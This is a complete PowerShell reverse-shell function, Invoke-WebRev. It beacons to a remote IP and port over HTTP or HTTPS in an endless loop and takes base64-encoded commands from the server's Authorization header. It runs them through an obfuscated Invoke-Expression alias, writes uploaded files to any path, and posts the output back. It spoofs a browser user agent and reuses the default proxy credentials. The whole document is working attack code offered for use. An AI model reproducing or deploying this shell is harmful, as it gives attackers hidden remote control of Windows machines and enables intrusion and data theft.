function Invoke-WebRev{
    param
    (
        [string]$ip,
        [string]$port,
        [switch]$ssl
    )

    $help=@"

.SYNOPSIS
    WebRev.
    PowerShell Function: Invoke-WebRev
    Author: Hector de Armas (3v4Si0N)

    Dependencias Requeridas: Ninguna
    Dependencias Opcionales: Ninguna
.DESCRIPTION
    .

.ARGUMENTS
    -ip   <IP>      Remote Host
    -port <PORT>    Remote Port
    -ssl            Send traffic over ssl

.EXAMPLE
    Invoke-Webrev -ip 192.168.29.131 -port 80
    Invoke-Webrev -ip 192.168.29.131 -port 443 -ssl
"@

    if(-not $ip -or -not $port) { return $help; }
    
    if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
    $postParams = @{result='start'};
    $x = "taleska-ei-vrixeka"; Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158])
    
    (New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;
    #[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12';
    [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols;

    while ($true)
    {
        try
        {
            $req = Invoke-WebRequest $url -UseBasicParsing -Method POST -Body $postParams -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36";
            $header = $req.Headers["Authorization"];
            $c = [System.Convert]::FromBase64String($header);
            $cstr = [System.Text.Encoding]::UTF8.GetString($c);
            $result = "";

            if($cstr.split(" ")[0] -eq "upload")
            {
                $uploadData = [System.Text.Encoding]::ASCII.GetString($req.Content);
                $location = $cstr.split(" ")[2];
                $content = [System.Convert]::FromBase64String($uploadData);
                $content | Set-Content $location -Encoding Byte
                $result = "[+] File uploaded successfully.";
                $cstr = "pwd";
            }
             
            Foreach ($string in taleska-ei-vrixeka $cstr)
            {
                $result += '_n1w_' + $string;
            };

            $result = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($result));
            $postParams = @{result=$result};
        }catch {};
    };
}

#Invoke-WebRev -ip 192.168.29.131 -port 443 -ssl
